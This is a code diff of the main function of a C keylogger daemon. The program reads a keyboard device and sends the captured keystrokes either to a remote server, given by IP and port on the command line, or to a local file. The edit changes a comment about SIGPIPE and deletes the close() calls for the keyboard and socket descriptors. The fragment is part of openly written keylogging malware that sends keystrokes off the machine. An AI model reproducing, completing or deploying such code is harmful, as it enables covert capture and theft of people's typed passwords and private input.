@@ -46,7 +46,7 @@ int main(int argc, char **argv)
         short port = atoi(argv[3]);
         if ((fd = openConnectionWithServer(ip, port)) < 0) // Connecting with server
             syslog(LOG_ERR, "Couldn't connect with server, check hostname or try again later: %s", strerror(errno)), exit(EXIT_FAILURE);
-        unblockSignal(SIGPIPE); // This signal will allow the daemon to terminate when server shuts down
+        unblockSignal(SIGPIPE); // We can terminate daemon only by sending SIGTERM or SIGKILL/SIGSTOP(not adviced)
     }
     else if (file_out_type == FILE) // If user decided to save events locally
     {
@@ -59,9 +59,7 @@ int main(int argc, char **argv)
     startKeylogger(keyboard, fd); // Reading from keyboard device and sending events to file
 
     syslog(LOG_INFO, "** Shutting down daemon **");
-    close(flock);    // Closing daemon's lock file
-    close(keyboard); // Closing keyboard device descriptor
-    close(fd);       // Closing socket or file descriptor
+    close(flock); // Closing daemon's lock file
     exit(EXIT_SUCCESS);
 }
 
